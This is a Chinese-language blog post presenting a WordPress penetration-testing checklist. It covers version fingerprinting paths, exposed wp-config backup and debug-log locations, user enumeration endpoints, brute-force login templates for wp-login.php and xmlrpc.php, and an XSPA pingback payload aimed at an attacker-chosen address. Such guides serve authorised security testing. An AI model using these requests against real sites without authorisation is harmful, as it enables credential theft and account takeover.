---
title: "Wordpress网站渗透方法指南"
date: 2022-09-15T08:00:18Z
draft: false
author: "n0tr00t"
authorLink: "https://n0tr00t.eu.org"
tags: ["Wordpress", "渗透测试", "漏洞挖掘"]
---
原作者：HACK学习呀
n0tr00t进行补充
> 如果您遇到使用 WordPress 的网站，您会怎么做，渗透思路和安全检测思路？

## 如何挖掘Wordpress网站的漏洞
如果您访问<https://target.com>并查看源代码，您将看到来自 WordPress 的主题和插件的链接。

或者你可以访问<https://target.com/wp-login.php>，它是 WordPress 登录管理页面

通过查看核心、插件和主题版本找到相关的CVE

## 如何找到wordpress版本
```
https://target.com/feed
https://target.com/?feed=rss2
https://target.com/.git/config
https://target.com/SECURITY.md (开发版)
```
## 如何找到插件版本
```
https://target.com/wp-content/plugins/PLUGINNAME/.git/config
https://target.com/wp-content/plugins/PLUGINNAME/changelog
https://target.com/wp-content/plugins/PLUGINNAME/changelog.txt
https://target.com/wp-content/plugins/PLUGINNAME/changelog.md
https://target.com/wp-content/plugins/PLUGINNAME/changelog.rst
https://target.com/wp-content/plugins/PLUGINNAME/version
https://target.com/wp-content/plugins/PLUGINNAME/readme
https://target.com/wp-content/plugins/PLUGINNAME/readme.txt
https://target.com/wp-content/plugins/PLUGINNAME/readme.md
https://target.com/wp-content/plugins/PLUGINNAME/readme.rst
https://target.com/wp-content/plugins/PLUGINNAME/readme.pdf
https://target.com/wp-content/plugins/PLUGINNAME/readme.doc
https://target.com/wp-content/plugins/PLUGINNAME/readme.docx
https://target.com/wp-content/plugins/PLUGINNAME/readme.ppt
https://target.com/wp-content/plugins/PLUGINNAME/readme.pptx
https://target.com/wp-content/plugins/PLUGINNAME/readme.MD
https://target.com/wp-content/plugins/PLUGINNAME/readme.RST
https://target.com/wp-content/plugins/PLUGINNAME/readme.TXT
https://target.com/wp-content/plugins/PLUGINNAME/readme.PDF
https://target.com/wp-content/plugins/PLUGINNAME/readme.DOC
https://target.com/wp-content/plugins/PLUGINNAME/readme.DOCX
https://target.com/wp-content/plugins/PLUGINNAME/readme.PPT
https://target.com/wp-content/plugins/PLUGINNAME/readme.PPTX
https://target.com/wp-content/plugins/PLUGINNAME/VERSION
https://target.com/wp-content/plugins/PLUGINNAME/README
https://target.com/wp-content/plugins/PLUGINNAME/README.txt
https://target.com/wp-content/plugins/PLUGINNAME/README.md
https://target.com/wp-content/plugins/PLUGINNAME/README.rst
https://target.com/wp-content/plugins/PLUGINNAME/README.pdf
https://target.com/wp-content/plugins/PLUGINNAME/README.doc
https://target.com/wp-content/plugins/PLUGINNAME/README.docx
https://target.com/wp-content/plugins/PLUGINNAME/README.ppt
https://target.com/wp-content/plugins/PLUGINNAME/README.pptx
https://target.com/wp-content/plugins/PLUGINNAME/README.MD
https://target.com/wp-content/plugins/PLUGINNAME/README.RST
https://target.com/wp-content/plugins/PLUGINNAME/README.TXT
https://target.com/wp-content/plugins/PLUGINNAME/README.PDF
https://target.com/wp-content/plugins/PLUGINNAME/README.DOC
https://target.com/wp-content/plugins/PLUGINNAME/README.DOCX
https://target.com/wp-content/plugins/PLUGINNAME/README.PPT
https://target.com/wp-content/plugins/PLUGINNAME/README.PPTX
```
## 如何找到主题版本
```
https://target.com/wp-content/themes/THEMENAME/style.css
https://target.com/wp-content/themes/THEMENAME/readme.txt (If they have readme file)
```
如果您发现过时的核心/插件/主题，请在<https://wpscan.com>找到漏洞利用

## 查找日志文件
```
http://target.com/wp-content/debug.log
```
## 查找备份文件 wp-config
```
http://target.com/.wp-config.php.swp
http://target.com/wp-config.inc
http://target.com/wp-config.old
http://target.com/wp-config.txt
http://target.com/wp-config.html
http://target.com/wp-config.php.bak
http://target.com/wp-config.php.dist
http://target.com/wp-config.php.inc
http://target.com/wp-config.php.old
http://target.com/wp-config.php.save
http://target.com/wp-config.php.swp
http://target.com/wp-config.php.txt
http://target.com/wp-config.php.7z
http://target.com/wp-config.php.tar
http://target.com/wp-config.php.gz
http://target.com/wp-config.php.zip
http://target.com/wp-config.php.html
http://target.com/wp-config.php~
```
## 获取网站上的用户名
```
http://target.com/?author=1
```
或者
```
http://target.com/wp-json/wp/v2/users
http://target.com/?rest_route=/wp/v2/users
```
## 爆破后台账号密码
```
POST /wp-login.php HTTP/1.1
Host: target.com

log=admin&pwd=BRUTEFORCE_IN_HERE&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftarget.com%2Fwp-admin%2F&testcookie=1
```
或者
```xml
POST /xmlrpc.php HTTP/1.1
Host: target.com

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>BRUTEFORCE_IN_HERE</value></param>
</params>
</methodCall>
```
## Wordpress 中的 XSPA
```xml
POST /xmlrpc.php HTTP/1.1
Host: target.com

<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://yourip:port</string></value>
</param><param>
<value>
<string>https://target.com></string>
</value>
</param></params>
</methodCall>
```
## 注册启用
<http://target.com/wp-login.php?action=register>
